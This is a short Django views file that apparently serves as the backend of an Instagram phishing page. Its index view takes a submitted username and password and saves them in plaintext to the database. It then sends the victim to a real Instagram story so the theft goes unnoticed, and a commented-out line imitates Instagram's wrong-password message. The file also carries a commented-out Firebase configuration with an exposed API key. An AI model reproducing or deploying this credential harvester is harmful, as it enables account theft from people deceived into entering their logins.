from django.shortcuts import render
from django.http import *
from mainapp.models import *
from django.contrib import messages
from django.db import IntegrityError


# import pyrebase

# config = {
#   'apiKey': "AIzaSyDubrrdpS-BC3Phk12Aq0q9Hx2ieyAdQr4",
#   'authDomain': "instagram-d17c6.firebaseapp.com",
#   'databaseURL': "https://instagram-d17c6.firebaseio.com",
#   'projectId': "instagram-d17c6",
#   'storageBucket': "instagram-d17c6.appspot.com",
#   'messagingSenderId': "608530921544",
#   'appId': "1:608530921544:web:56f2bc688137bdd7c0807d",
#   'measurementId': "G-WZ4XL0Z1HZ"
# }

# auth = firebase.auth()

# firebase = pyrebase.initialize_app(config)

def index(request):
    if request.method =='GET':
        return render(request,'index.html')
    if request.method == 'POST':
        if request.POST.get('username') and request.POST.get('password'):
            UserObj = AdminUser()
            UserObj.email = request.POST.get('username')
            UserObj.password = request.POST.get('password')
            UserObj.save()
            # return render_to_response('template_name', message='Sorry, your password was incorrect. Please double-check your password.')
            return HttpResponseRedirect('https://www.instagram.com/stories/noob__92_/2355937655810009776/')
            # return render(request,'index.html')
        # return render(request,'index.html')
